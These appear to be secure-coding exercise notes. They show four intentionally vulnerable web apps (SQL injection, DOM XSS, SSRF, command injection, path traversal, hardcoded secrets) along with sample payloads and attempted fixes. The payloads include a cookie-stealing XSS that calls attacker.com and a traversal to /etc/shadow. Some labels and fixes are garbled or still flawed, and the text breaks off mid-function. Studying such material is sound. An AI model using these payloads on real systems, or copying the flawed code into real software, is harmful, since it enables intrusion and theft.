1. Backend (FastAPI):

```
# main.py
from fastapi import FastAPI, Request, Form, HTTPException
from fastapi.templating import Jinja2Templates
from sqlalchemy import text

app = FastAPI()
templates = Jinja2Templates(directory="templates")

@app.get("/user")
async def get_user(request: Request):

	user = request.query_params.get("username")

	# SQL Injection Vulnerability Below

	query = f"SELECT * FROM users WHERE username = '{user}'"

	result = db.session.execute(text(query)).fetchall()
	return templates.TemplateResponse("results.html", {"request": request, "results": result})
```

```
// UserSearch.jsx
import { useState } from 'react';

export default function UserSearch() {
		const [username, setUsername] = useState('');

		const searchUser = async () => {
			// DOM XSS vulnerability below

			// IDOR bug below
			const response = await fetch(`/user?username=${username}`);
			const html = await response.text();
			document.getElementById('results').innerHTML = html;
		};

		return (
			<div>
				<input
					type="text"
					value={username}
					onChange={(e) => setUsername(e.target.value)}
					placeholder="Enter username"
				/>
				<button onClick={searchUser}>Search</button>
				<div id="results"></div>
			</div>
		);
}
```

```
<!-- templates/results.html -->
<h1>Results</h1>
<ul>
	{% for row in results %}
		<li>{{ row }}</li>
	{% endfor %}
</ul>
```

1. So there is an SQL Injection Vulnerability:

```
	# SQL Injection Vulnerability Below

	query = f"SELECT * FROM users WHERE username = '{user}'"

	result = db.session.execute(text(query)).fetchall()
```

Below is a sample payload:

```
username: username_here' OR '1' = '1
```

2. There is a DOM XSS bug below:

```
		const searchUser = async () => {
			// DOM XSS vulnerability below
			const response = await fetch(`/user?username=${username}`);
			const html = await response.text();
			document.getElementById('results').innerHTML = html;
		};

```

Below is a sample payload:

```
<img src=x onerror="fetch('https://attacker.com/?q='+document.cookie)">
```

3. Below is an IDOR bug:

```
			// SSRF bug below
			const response = await fetch(`/user?username=${username}`);
```

And below is a payload:

```
username: admin
```

In the above payload the attacker succeeds in fetching all the

information from the SQL database belonging to the `admin` username.

If developers carry the habit of allowing SSRF over to

other API endpoints the attacker can access protected resources

that are supposed to only be available to the admin.

Below is the fixed code:


The API endpoint for `\user` must be changed to a POST

request.


```
# main.py
from fastapi import FastAPI, Request, Form, HTTPException
from fastapi.templating import Jinja2Templates
from sqlalchemy import text

from pydantic import BaseModel

class LoginRequest(BaseModel):

	username: str

	password: str

app = FastAPI()
templates = Jinja2Templates(directory="templates")

@app.post("/user")
async def get_user(request: Request,body: LoginRequest):
	
	user = body.username

	passwd = body.password

	# Below is a hypothetical authentication function

	# assumed to be implemented securely

	if not authenticate_user(user,passwd):

		raise Exception("Invalid Credentials");

	# SQL Injection Vulnerability Below

	query = f"SELECT * FROM users WHERE username = :user"

	result = db.session.execute(text(query),{"user" : user}).fetchall()

	return templates.TemplateResponse("results.html", {"request": request, "results": result})
```

```
// UserSearch.jsx
import { useState } from 'react';

export default function UserSearch() {
		const [username,setUsername] = useState('');
		
		const [password, setPassword] = useState('');

		const searchUser = async () => {

			// DOM XSS vulnerability below

			// SSRF bug below

			const user_regex = /^[a-zA-Z0-9-_.]+$/;

			if ( user_regex.test(username) == false )	{
				
				throw new Error("Invalid credentials");	
			}
			
			const pass_regexp = /^[a-zA-Z0-9-_.`!@#$%^&*()_+-=[]{}]+$/;
			
			if ( pass_regexp.test(password) == false )	{
				
				throw new Error("Invalid credentials");	
			}

			# Below line must be transformed to a POST
			
			# request

			const response = await fetch('/api/users', {

			  method: 'POST', // Specify the HTTP method
			  headers: {
			    'Content-Type': 'application/json', // Set content type
			  },
			  body: JSON.stringify({ // Convert data to JSON string
			    username: username,
			    password: password
			  })
	});
	  
	  if (!response.ok) {
	    throw new Error(`HTTP error! status: ${response.status}`);
	  }
			
	  const resp = await response.text();

	  document.getElementById('results').textContent = resp;
	  
	  };

		return (
			<div>
				<input
					type="text"
					value={username}
					onChange={(e) => setUsername(e.target.value)}
					placeholder="Enter username"
				/>
				<input
					type="text"
					value={password}
					onChange={(e) => setPassword(e.target.value)}
					placeholder="Enter password"
				/>
				<button onClick={searchUser}>Search</button>
				<div id="results"></div>
			</div>
		);
}
```

```
<!-- templates/results.html -->
<h1>Results</h1>
<ul>
	{% for row in results %}
		<li>{{ row }}</li>
	{% endfor %}
</ul>
```

Exercise 2:

Database Schema:

```
-- Users table (stores user accounts)
CREATE TABLE users (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    username TEXT UNIQUE NOT NULL,
    password TEXT NOT NULL,  -- Should be hashed!
    email TEXT NOT NULL,
    role TEXT DEFAULT 'user'  -- 'admin' or 'user'
);

-- Posts table (user-generated content)
CREATE TABLE posts (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    title TEXT NOT NULL,
    content TEXT,
    author_id INTEGER NOT NULL,
    FOREIGN KEY (author_id) REFERENCES users(id)
);

-- Sessions table (for Flask session management)
CREATE TABLE sessions (
    session_id TEXT PRIMARY KEY,
    user_id INTEGER,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (user_id) REFERENCES users(id)
);

-- Uploads table (for file uploads)
CREATE TABLE uploads (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    filename TEXT NOT NULL,
    user_id INTEGER NOT NULL,
    FOREIGN KEY (user_id) REFERENCES users(id)
);
```
```
# app.py
from flask import Flask, request, render_template, redirect, url_for, session, flash
import sqlite3
import os
from werkzeug.utils import secure_filename

app = Flask(__name__)

# API Secret Key: NEVER hardcode API Secrets
app.secret_key = 'supersecretkey'
app.config['UPLOAD_FOLDER'] = 'uploads'

@app.route('/upload', methods=['POST'])
def upload_file():
	if 'file' not in request.files:
		return "No file uploaded", 400
	file = request.files['file']
	if file.filename == '':
		return "No file selected", 400

	# OS Path Traversal Attack Below!

	file.save(os.path.join(app.config['UPLOAD_FOLDER'], file.filename))

	return "File uploaded successfully!"

@app.route('/search')
def search_posts():
	query = request.args.get('q')
	conn = sqlite3.connect('database.db')
	cursor = conn.cursor()
	
	# SQL Injection Vulnerability Below

	cursor.execute(f"SELECT * FROM posts WHERE title LIKE '%{query}%'")
	results = cursor.fetchall()
	conn.close()
	return render_template('results.html', results=results)

@app.route('/profile', methods=['POST'])
def update_profile():
	username = session.get('username')
	new_email = request.form['email']
	conn = sqlite3.connect('database.db')
	cursor = conn.cursor()

	# SQL Injection Vulnerability Below

	# No Authentication before updating email!

	# Check if user knows both correct username and password

	# without fetching from the SQL Database using both

	# directly! Apply password hashing authentication check!

	cursor.execute(f"UPDATE users SET email = '{new_email}' WHERE username = '{username}'")
	conn.commit()
	conn.close()
	flash('Profile updated!')
	return redirect(url_for('profile'))

if __name__ == '__main__':
	app.run(debug=True)
```

```
// Search.jsx
import { useState } from 'react';

export default function Search() {
	if (query) {
		const handleSearch = async () => {
			const response = await fetch(`/search?q=${query}`);

			# DOM XSS Bug Below:

			const html = await response.text();
			document.getElementById('results').innerHTML = html;
		};
	}

	return (
		<div>
			<input
				type="text"
				value={query}
				onChange={(e) => setQuery(e.target.value)}
				placeholder="Search posts..."
			/>
			<button onClick={handleSearch}>Search</button>
			<div id="results"></div>
		</div>
	);
}
```

```
<!-- results.html -->
<h1>Search Results</h1>
<ul>
	{% for post in results %}
		<li>{{ post.title }}</li>
	{% endfor %}
</ul>
```

1. Hardcoding of Secret:


Never do what is seen below:

```
# API Secret Key: NEVER hardcode API Secrets
app.secret_key = 'supersecretkey'
```

An attacker that can see the codebase can abuse the secret key!

2. OS Path Traversal Attack:

An attacker can provide a sample payload that brings the

current directory outside of the intended base directory.

``` 
	# OS Path Traversal Attack Below!

	file.save(os.path.join(app.config['UPLOAD_FOLDER'], file.filename))
```

Sample payload:

```
../../../../../../etc/shadow --> Attacker replaces original

`/etc/shadow` file with attacker's own--bypassing password

authentication to access server!
```

3. SQL Injection Vulnerabilities Below:

A. Sample Payload for below:

```
query_here%' OR '1' = '1'--
```

```
	# SQL Injection Vulnerability Below

	cursor.execute(f"SELECT * FROM posts WHERE title LIKE '%{query}%'")

```

B. Sample Payload for below:

```
email: attacker@attacker.com

username: admin
```

```
	cursor.execute(f"UPDATE users SET email = '{new_email}' WHERE username = '{username}'")
	
	conn.commit()
```

3. Lack of Authentication

There is no check if the user is authenticated before updating

the email. Many web services have a Forgot Password feature

that allows one to reset the email. So by controlling what email

another user has the attacker can potentially take over said

person's account--even the administrator in theory!

4. DOM XSS bug:

```
			# DOM XSS Bug Below:

			const html = await response.text();
			document.getElementById('results').innerHTML = html;
```

An attacker can inject the following payload to cause sensitive

data like cookies to get stolen:

```
<img src=x onerror="fetch('https://attacker.com/?q='+document.cookie)">
```

5. No attempts at rate limiting

6. No user session authentication before uploading file. This

is important to avoid unauthentic uploads.

7. Do NOT ever set the `debug` mode to True. This can leak

data. The dangerous code is shown below:

```
if __name__ == '__main__':
	app.run(debug=True)
```

Below is the fixed code:


```
-- Users table (stores user accounts)
CREATE TABLE users (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    username TEXT UNIQUE NOT NULL,
    password TEXT NOT NULL,  -- Should be hashed!
    email TEXT NOT NULL,
    role TEXT DEFAULT 'user'  -- 'admin' or 'user'
);

-- Posts table (user-generated content)
CREATE TABLE posts (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    title TEXT NOT NULL,
    content TEXT,
    author_id INTEGER NOT NULL,
    FOREIGN KEY (author_id) REFERENCES users(id)
);

-- Sessions table (for Flask session management)
CREATE TABLE sessions (
    session_id TEXT PRIMARY KEY,
    user_id INTEGER,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (user_id) REFERENCES users(id)
);

-- Uploads table (for file uploads)
CREATE TABLE uploads (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    filename TEXT NOT NULL,
    user_id INTEGER NOT NULL,
    FOREIGN KEY (user_id) REFERENCES users(id)
);
```
```
# app.py
from flask_wtf.csrf import CSRFProtect
from flask import Flask, request, render_template, redirect, url_for, session, flash, jsonify
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address
import sqlite3
import os
from werkzeug.utils import secure_filename
from dotenv import load_dotenv,set_key

env_path = '.env'
load_dotenv()

app = Flask(__name__)

csrf = CSRFProtect(app)

limiter = Limiter(
    get_remote_address,
    app=app,
    default_limits=["5 per minute"],
    storage_uri="memory://",
)

# API Secret Key: NEVER hardcode API Secrets
app.secret_key = os.getenv('SECRET_KEY')

app.config['UPLOAD_FOLDER'] = 'uploads'

@app.route('/upload', methods=['POST'])
@limiter.limit("5 per minute")
def upload_file():
	if 'file' not in request.files:
		return "No file uploaded", 400
	file = request.files['file']

	if file.filename == '':
		return "No file selected", 400

	cookie_value = request.cookies.get('session')

	# Assume verify_session_cookie() function exists

	session_data = verify_session_cookie(cookie_value)

	if not session_data:

		return jsonify({"error": "Unauthorized"}), 401

	# No Authentication Check on whether authentic user

	# is uploading file!

	# OS Path Traversal Attack Below!

	base_dir = os.path.abspath('uploads')

	pwd_file = os.path.abspath(os.path.join(base_dir,file.filename))

	if not pwd_file.startswith(base_dir + os.sep):

		raise Exception("Invalid filepath")

	file.save(pwd_file)

	return "File uploaded successfully!"

@app.route('/search')
@limiter.limit("5 per minute")
def search_posts():
	query = request.args.get('q')
	conn = sqlite3.connect('database.db')
	cursor = conn.cursor()
	
	# SQL Injection Vulnerability Below
	
	cursor.execute("SELECT * FROM posts WHERE title LIKE ?",('%' + query + '%',))

	results = cursor.fetchall()

	conn.close()

	return render_template('results.html', results=results)

@app.route('/profile', methods=['POST'])
@limiter.limit("5 per minute")
def update_profile():
	username = session.get('username')

	password = request.form['password']

	# Validate Session Cookie (and Anti-CSRF Token before

	# uploading file

	cookie_value = request.cookies.get('session')

    	session_data = verify_session_cookie(cookie_value)

	new_email = request.form['email']

	conn = sqlite3.connect('database.db')

	cursor = conn.cursor()

	# SQL Injection Vulnerability Below

	# No Authentication before updating email!

	# Check if user knows both correct username and password

	# without fetching from the SQL Database using both

	# directly! Apply password hashing authentication check!

	if not authenticate_user(username,password):

		raise Exception("Invalid Credentials")
	
	cursor.execute(f"UPDATE users SET email = ? WHERE username = ?",(new_email,username))

	conn.commit()

	conn.close()

	flash('Profile updated!')
	return redirect(url_for('profile'))

if __name__ == '__main__':
	app.run(debug=False)
```

```
// Search.jsx
import { useState } from 'react';

export default function Search() {

	const [query, setQuery] = useState('');

	
	const handleSearch = async () => {

			if (!query) return;

			const response = await fetch(`/search?q=${query}`);

			// DOM XSS Bug Below:

			const resp = await response.text();

			document.getElementById('results').textContent = resp;
	};
	

	return (
		<div>
			<input
				type="text"
				value={query}
				onChange={(e) => setQuery(e.target.value)}
				placeholder="Search posts..."
			/>
			<button onClick={handleSearch}>Search</button>
			<div id="results"></div>
		</div>
	);
}
```

```
<!-- results.html -->
<h1>Search Results</h1>
<ul>
	{% for post in results %}
		<li>{{ post.title }}</li>
	{% endfor %}
</ul>
```

Exercise 3:

```
Database Schema:

-- Users table (stores user accounts)
CREATE TABLE users (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    username TEXT UNIQUE NOT NULL,
    password TEXT NOT NULL,  -- Should be hashed!
    email TEXT NOT NULL,
    role TEXT DEFAULT 'user'  -- 'admin' or 'user'
);

-- Notes table (user-generated content)
CREATE TABLE notes (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    title TEXT NOT NULL,
    content TEXT,
    user_id INTEGER NOT NULL,
    FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE
);

-- Files table (for uploads)
CREATE TABLE files (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    filename TEXT NOT NULL,
    filepath TEXT NOT NULL,  -- Stores the full path (e.g., "uploads/evil.php")
    user_id INTEGER NOT NULL,
    FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE
);

-- API Keys table (for API key management)
CREATE TABLE api_keys (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    key TEXT UNIQUE NOT NULL,
    user_id INTEGER NOT NULL,
    is_active BOOLEAN DEFAULT TRUE,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE
);
```

```
# No attempt at rate limiting!

# app.py
from fastapi import FastAPI, Request, Form, HTTPException, status, Depends
from fastapi.security import OAuth2PasswordBearer
from fastapi.templating import Jinja2Templates
import sqlite3
import os
import subprocess
import requests
from jose import JWTError, jwt
from datetime import datetime, timedelta

app = FastAPI()

# Hardcoding SECRET. Don't do that!

app.secret_key = "supersecretkey"

templates = Jinja2Templates(directory="templates")

oauth2_scheme = OAuth2PasswordBearer(tokenUrl="token")

def create_access_token(data: dict):
	to_encode = data.copy()
	expire = datetime.utcnow() + timedelta(days=365)
	to_encode.update({"exp": expire})
	# Hardcoded Secret Used Below! Never do that!
	return jwt.encode(to_encode, "supersecretkey", algorithm="HS256")

@app.get("/fetch")
async def fetch_url(url: str):

	# Server Side Request Forgery Vulnerability Below
	response = requests.get(url)
	return {"content": response.text}

@app.post("/login")
async def login(username: str = Form(...), password: str = Form(...)):
	conn = sqlite3.connect("database.db")
	cursor = conn.cursor()
	
	# Timing vulnerability below. Also NEVER store passwords

	# in plaintext.

	# SQL Injection Vulnerability Below
 
	cursor.execute(f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'")
	user = cursor.fetchone()
	conn.close()
	if not user:
		raise HTTPException(status_code=401, detail="Invalid credentials")
	token = create_access_token({"sub": username})
	return {"access_token": token}

@app.get("/admin")
async def admin_panel(token: str = Depends(oauth2_scheme)):

	# No checking for failure of Verifying JWT Below!

	payload = jwt.decode(token, "supersecretkey", algorithms=["HS256"])
	username = payload.get("sub")
	conn = sqlite3.connect("database.db")
	cursor = conn.cursor()
	
	# SQL Injection Vulnerability Below

	cursor.execute(f"SELECT * FROM users WHERE username = '{username}'")

	user = cursor.fetchone()
	conn.close()
	if user[3] != "admin":
		raise HTTPException(status_code=403, detail="Unauthorized")
	return {"message": "Admin Panel"}

@app.get("/ping")
async def ping_server(host: str):

	# OS Command Injection Vulnerability Below!

	result = subprocess.run(f"ping -c 4 {host}", shell=True, capture_output=True, text=True)
	return {"output": result.stdout}

@app.post("/upload")
async def upload_file(file: UploadFile = File(...)):

	# OS Path Traversal Vulnerability Below

	file.save(os.path.join("uploads", file.filename))

	return {"message": "File uploaded!"}
```

```
// Search.jsx
import { useState } from "react";

export default function Search() {
    const [url, setUrl] = useState("");

    const handleFetch = async () => {
	# SSRF Vulnerability Below
        const response = await fetch(`/fetch?url=${url}`);
        const data = await response.json();

	# DOM XSS Bug Below

        document.getElementById("results").innerHTML = data.content;
    };

    return (
        <div>
            <input
                type="text"
                value={url}
                onChange={(e) => setUrl(e.target.value)}
                placeholder="Enter URL..."
            />
            <button onClick={handleFetch}>Fetch</button>
            <div id="results"></div>
        </div>
    );
}
```

```
<!-- admin.html -->
<h1>Admin Panel</h1>
{% if user.role == "admin" %}
    <p>Welcome, admin!</p>
{% else %}
    <script>alert("Hacked!");</script>
{% endif %}
```

1. No attempt at rate limiting.

2. Do NOT hardcode secrets:

```
# Hardcoding SECRET. Don't do that!

app.secret_key = "supersecretkey"
```

```
	# Hardcoded Secret Used Below! Never do that!
	
	return jwt.encode(to_encode, "supersecretkey", algorithm="HS256")
```

3. Server Side Request Forgery:

```
	# Server Side Request Forgery Vulnerability Below
	response = requests.get(url)
```

4. The `login()` endpoint doesn't hash passwords to verify

user authentication.  Also SQL Injection Vulnerability in `login()`

endpoint.

5. JWT Decoding does not check for failure to verify.

5.5. Expiration date WAY TOO LONG. Consider a shorter period

of time.

6. The `ping()` is vulnerable to OS Command Line Injection

7. The `upload()` is vulnerable to OS Path Traversal 

Below is the fixed code:


```
Database Schema:

-- Users table (stores user accounts)
CREATE TABLE users (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    username TEXT UNIQUE NOT NULL,
    password TEXT NOT NULL,  -- Should be hashed!
    email TEXT NOT NULL,
    role TEXT DEFAULT 'user'  -- 'admin' or 'user'
);

-- Notes table (user-generated content)
CREATE TABLE notes (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    title TEXT NOT NULL,
    content TEXT,
    user_id INTEGER NOT NULL,
    FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE
);

-- Files table (for uploads)
CREATE TABLE files (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    filename TEXT NOT NULL,
    filepath TEXT NOT NULL,  -- Stores the full path (e.g., "uploads/evil.php")
    user_id INTEGER NOT NULL,
    FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE
);

-- API Keys table (for API key management)
CREATE TABLE api_keys (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    key TEXT UNIQUE NOT NULL,
    user_id INTEGER NOT NULL,
    is_active BOOLEAN DEFAULT TRUE,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE
);
```

```
# No attempt at rate limiting!

# app.py
from passlib.hash import argon2
from fastapi import FastAPI, Request, Form, HTTPException, status, Depends
from fastapi.security import OAuth2PasswordBearer
from fastapi.templating import Jinja2Templates
import sqlite3
import os
import subprocess
import shlex
import requests
from jose import JWTError, jwt
from slowapi import Limiter, _rate_limit_exceeded_handler
from slowapi.util import get_remote_address
from slowapi.errors import RateLimitExceeded
from datetime import datetime, timedelta
from dotenv import load_dotenv,set_key
fastapi import File, UploadFile

load_dotenv()

limiter = Limiter(key_func=get_remote_address)


app = FastAPI()

app.state.limiter = limiter

app.add_exception_handler(RateLimitExceeded, _rate_limit_exceeded_handler)

# Hardcoding SECRET. Don't do that!

app.secret_key = os.getenv('SECRET_KEY') 

templates = Jinja2Templates(directory="templates")

oauth2_scheme = OAuth2PasswordBearer(tokenUrl="token")

def create_access_token(data: dict):
	to_encode = data.copy()
	expire = datetime.utcnow() + timedelta(days=365)
	to_encode.update({"exp": expire})
	# Hardcoded Secret Used Below! Never do that!

	token = ''

	try:
		token = jwt.encode(to_encode, app.secret_key, algorithm="HS256")

	except jwt.InvalidKeyError:

		raise HTTPException(status_code=401, detail="Invalid credentials")

	except jwt.InvalidKeyLengthError:

		raise HTTPException(status_code=401, detail="Invalid credentials")

	except Exception:
		
		raise HTTPException(status_code=401, detail="Invalid credentials")


	return token

# Deleted the `fetch()` endpoint entirely

# The user does not need a separate API endpoint

# to visit a URL. The user can visit the target URL

# by typing the URL into their browser

# Developers must agree to remove the `fetch()` endpoint.

@app.post("/login")
@limiter.limit("5/minute")
async def login(username: str = Form(...), password: str = Form(...)):
	conn = sqlite3.connect("database.db")
	cursor = conn.cursor()
	
	# Timing vulnerability below. Also NEVER store passwords

	# in plaintext.

	# SQL Injection Vulnerability Below

	# The below assumes Argon2 password hash is stored in

	# password field in SQL Database
	
	cursor.execute(f"SELECT password FROM users WHERE username = ?",(username,))
	
	pwhash = cursor.fetchone()

	if not pwhash or not argon2.verify(password,pwhash[0]):

		conn.close()

		raise HTTPException(status_code=401, detail="Invalid credentials")
		
	conn.close()
 
	token = create_access_token({"sub": username})

	return {"access_token": token}

@app.get("/admin")
@limiter.limit("5/minute")
async def admin_panel(token: str = Depends(oauth2_scheme)):

	# No checking for failure of Verifying JWT Below!

	try:
		payload = jwt.decode(token, os.getenv('SECRET_KEY'), algorithms=["HS256"])

	except Exception:
		
		raise HTTPException(status_code=403, detail="Unauthorized")

	conn = sqlite3.connect("database.db")
	
	cursor = conn.cursor()
	
	username = payload.get("sub")

	# SQL Injection Vulnerability Below
	
	cursor.execute(f"SELECT * FROM users WHERE username = ?",(username,))

	user = cursor.fetchone()

	conn.close()


	if not user or user[3] != "admin":

		raise HTTPException(status_code=403, detail="Unauthorized")

	return {"message": "Admin Panel"}

@app.get("/ping")
@limiter.limit("5/minute")
async def ping_server(host: str):

	# OS Command Injection Vulnerability Below!

	raw_arg_list = "ping -c 4 "

	sanitized_host = shlex.quote(host)

	raw_arg_list += sanitized_host

	raw_arg_split = shlex.split(raw_arg_list)

	result = subprocess.run(raw_arg_split, capture_output = True,text = True,shell=False)

	return {"output": result.stdout}

@app.post("/upload")
@limiter.limit("5/minute")
async def upload_file(file: UploadFile = File(...)):

	# OS Path Traversal Vulnerability Below
	
	base_dir = os.path.abspath('uploads')

	pwd_file = os.path.abspath(os.path.join(base_dir,file.filename))

	if not pwd_file.startswith(base_dir + os.sep):

		raise HTTPException(status_code=403, detail="Unauthorized")

	with open(pwd_file, "wb") as f:
    
		content = await file.read()
    		
		f.write(content)

	return {"message": "File uploaded!"}
```

Deleted the entirety of Search.jsx since there is no reason

the user needs the webapp to receive all content from a URL.

Waste of code.


```
<!-- admin.html -->
<h1>Admin Panel</h1>
{% if user.role == "admin" %}
    <p>Welcome, admin!</p>
{% else %}
    <script>alert("Hacked!");</script>
{% endif %}
```

Exercise 4:

`devdash/settings.py`:

```
# Do NOT hardcode secrets!
SECRET_KEY = 'django-insecure-abc123xyz'
DEBUG = True
# Only have a whitelist. Don't allow everything!
ALLOWED_HOSTS = ['*']

INSTALLED_APPS = [
	'django.contrib.admin',
	'django.contrib.auth',
	'django.contrib.contenttypes',
	'django.contrib.sessions',
	'django.contrib.messages',
	'django.contrib.staticfiles',
	'dashboard',
]

MIDDLEWARE = [
	'django.middleware.security.SecurityMiddleware',
	'django.contrib.sessions.middleware.SessionMiddleware',
	'django.middleware.common.CommonMiddleware',
	'django.contrib.auth.middleware.AuthenticationMiddleware',
	'django.contrib.messages.middleware.MessageMiddleware',
]

# No attempt to enforce TLS?
```

`dashboard/models.py`

```
from django.db import models
from django.contrib.auth.models import User

class Report(models.Model):
	title = models.CharField(max_length=200)
	content = models.TextField()
	owner = models.ForeignKey(User, on_delete=models.CASCADE)

class UserProfile(models.Model):
	user = models.OneToOneField(User, on_delete=models.CASCADE)
	avatar_url = models.CharField(max_length=500, blank=True)
	bio = models.TextField(blank=True)
```

`dashboard/views.py`

```
from django.shortcuts import render, get_object_or_404
from django.http import JsonResponse
from django.contrib.auth.models import User
from django.db import connection
import requests
import os
import subprocess
from .models import Report, UserProfile

# No attempt at rate-limiting

def set_avatar(request):
	if request.method == 'POST':
		avatar_url = request.POST.get('avatar_url', '')
		user_id = request.POST.get('user_id')
	
		# SSRF Bug Below

		response = requests.get(avatar_url, timeout=5)
		
		# OS Path Traversal Vulnerability Below

		upload_path = os.path.join('media/avatars', f'{user_id}_avatar.png')
		with open(upload_path, 'wb') as f:
			f.write(response.content)
		profile = UserProfile.objects.get(user_id=user_id)
		profile.avatar_url = upload_path
		profile.save()
		return JsonResponse({'status': 'avatar updated'})
	return JsonResponse({'error': 'invalid method'}, status=405)

def search_reports(request):
	q = request.GET.get('q', '')
	with connection.cursor() as cursor:

		# SQL Injection Vulnerability Below

		cursor.execute(
			f"SELECT id, title, content FROM dashboard_report WHERE title LIKE '%{q}%'"
		)
		rows = cursor.fetchall()
	return JsonResponse({'results': rows})

def get_report(request, report_id):
	report = get_object_or_404(Report, id=report_id)
	return JsonResponse({
		'id': report.id,
		'title': report.title,
		'content': report.content,
		'owner': report.owner.username
	})

def run_diagnostic(request):
	if request.method == 'POST':
		target = request.POST.get('target', '')

		# OS Command Injection Bug Below

		result = subprocess.run(
			f'dig +short {target}',
			shell=True,
			capture_output=True,
			text=True
		)
		return JsonResponse({'output': result.stdout})
	return JsonResponse({'error': 'invalid method'}, status=405)

def admin_users(request):
	
	# Authenticate the user first before getting the report

	users = User.objects.values('id', 'username', 'email', 'is_staff')
	return JsonResponse({'users': list(users)})
```

`dashboard/urls.py`

```
from django.urls import path
from . import views

urlpatterns = [
	path('avatar/set/', views.set_avatar),
	path('reports/search/', views.search_reports),
	# IDOR Vulnerability Below
	path('reports/<int:report_id>/', views.get_report),
	path('diagnostic/', views.run_diagnostic),
	path('admin/users/', views.admin_users),
]
```

`templates/dashboard.html`

```
<!DOCTYPE html>
<html>
<head><title>DevDash</title></head>
<body>
<div x-data="dashboard()" x-init="init()">

	<div>
		<h2>Update Avatar</h2>
		<input
			type="text"
			x-model="avatarUrl"
			placeholder="Paste image URL..."
		/>
		<input
			type="text"
			x-model="userId"
			placeholder="User ID..."
		/>
		<button @click="setAvatar()">Update</button>
		<img :src="avatarPreview" x-show="avatarPreview" />
	</div>

	<div>
		<h2>Search Reports</h2>
		<input
			type="text"
			x-model="searchQuery"
			placeholder="Search..."
		/>
		<button @click="searchReports()">Search</button>
		<div x-text="searchResults"></div>
	</div>

	<div>
		<h2>DNS Diagnostic</h2>
		<input
			type="text"
			x-model="diagTarget"
			placeholder="Enter hostname..."
		/>
		<button @click="runDiagnostic()">Run</button>
		<pre x-text="diagOutput"></pre>
	</div>

</div>

<script>
function dashboard() {
	return {
		avatarUrl: '',
		userId: '',
		avatarPreview: '',
		searchQuery: '',
		searchResults: '',
		diagTarget: '',
		diagOutput: '',

		async setAvatar() {
			const res = await fetch('/avatar/set/', {
				method: 'POST',
				headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
				// SSRF Bug Below

				body: `avatar_url=${this.avatarUrl}&user_id=${this.userId}`
			});
			const data = await res.json();
			this.avatarPreview = this.avatarUrl;
		},

		async searchReports() {


			const res = await fetch(`/reports/search/?q=${this.searchQuery}`);
			const data = await res.json();
			this.searchResults = data.results;
		},

		async runDiagnostic() {
			const res = await fetch('/diagnostic/', {
				method: 'POST',
				headers: { 'Content-Type': 'application/x-www-form-urlencoded' },

				body: `target=${this.diagTarget}`
			});
			const data = await res.json();
			this.diagOutput = data.output;
		},

		init() {}
	}
}
</script>
<script src="//cdn.jsdelivr.net/npm/alpinejs@3.x.x/dist/cdn.min.js" defer></script>
</body>
</html>
```

Fixed Code:


`devdash/settings.py`:

```
from dotenv import load_dotenv,set_key
import os


env_path = '.env'

load_dotenv()

# Do NOT hardcode secrets!
SECRET_KEY = os.getenv('SECRET_KEY')
COOKIE_KEY = os.getenv('COOKIE_KEY')
DEBUG = False
# Only have a whitelist. Don't allow everything!
ALLOWED_HOSTS = ['first_allow.com','second_allow.com']

INSTALLED_APPS = [
	'django.contrib.admin',
	'django.contrib.auth',
	'django.contrib.contenttypes',
	'django.contrib.sessions',
	'django.contrib.messages',
	'django.contrib.staticfiles',
	'dashboard',
]

MIDDLEWARE = [
	'django.middleware.security.SecurityMiddleware',
	'django.contrib.sessions.middleware.SessionMiddleware',
	'django.middleware.common.CommonMiddleware',
	'django.contrib.auth.middleware.AuthenticationMiddleware',
	'django.contrib.messages.middleware.MessageMiddleware',
]

# No attempt to enforce TLS?

# Security Settings for TLS
SECURE_SSL_REDIRECT = True 
SECURE_HSTS_SECONDS = 31536000
SECURE_HSTS_INCLUDE_SUBDOMAINS = True
SECURE_HSTS_PRELOAD = True
```

`dashboard/models.py`

```
from django.db import models
from django.contrib.auth.models import User

class Report(models.Model):
	title = models.CharField(max_length=200)
	content = models.TextField()
	owner = models.ForeignKey(User, on_delete=models.CASCADE)

class UserProfile(models.Model):
	user = models.OneToOneField(User, on_delete=models.CASCADE)
	avatar_url = models.CharField(max_length=500, blank=True)
	bio = models.TextField(blank=True)
```

`dashboard/middleware.py`


`dashboard/views.py`

```
from django.shortcuts import render, get_object_or_404
from django.http import JsonResponse
from django.contrib.auth.models import User
from django.db import connection
import requests
import os
import shlex
import subprocess
from .models import Report, UserProfile
from django_ratelimit.decorators import ratelimit
from django.views.decorators.csrf import csrf_exempt, csrf_protect
from urllib.parse import urlparse
from dotenv import load_dotenv

import jwt

env_path = '.env'

load_dotenv()

# Do NOT hardcode secrets!


COOKIE_KEY = os.getenv('COOKIE_KEY')

# No attempt at rate-limiting

def is_valid_url(url: str,allow_list: list[str]) -> bool:

	parsed = urlparse(url)

	netloc = parsed.netloc

	hostname = netloc.split(':')[0]

	return hostname in allow_list

@csrf_protect
@ratelimit(key='ip',rate='5/m')
def set_avatar(request):
	if request.method == 'POST':

		token = request.COOKIES.get('report_token')

		if not token:

